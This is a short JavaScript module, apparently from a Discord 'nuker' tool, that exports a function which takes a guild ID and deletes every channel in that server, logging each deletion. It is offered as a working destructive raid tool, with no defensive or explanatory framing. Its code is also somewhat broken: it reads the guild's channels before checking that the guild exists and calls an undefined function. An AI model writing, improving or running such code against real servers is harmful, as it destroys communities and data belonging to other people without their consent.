const consoleColour = require('gradient-string');

async function nuker(guildId, xeroz)
	{
		process.title = `${xeroz.user.username} | [1: NUKING]`;
		const guild = xeroz.guilds.cache.get(guildId);
		const channels = guild.channels.cache;
	  
		if (!guild) 
		{
		  process.title = `${xeroz.user.username} | [ERROR]`;
		  console.log(consoleColour.mind("[Error] : ") + `Guild with ID ${guildId} does not exist.`);
		   Xeroz();
		} else 
		{
		  channels.forEach(async channel => 
			{
			console.log(consoleColour.mind("[Deleted] : ") + "Channel " +  channel.name);
			channel.delete();
		 	});
		}
	}

module.exports = {
	Nuke: nuker
	};	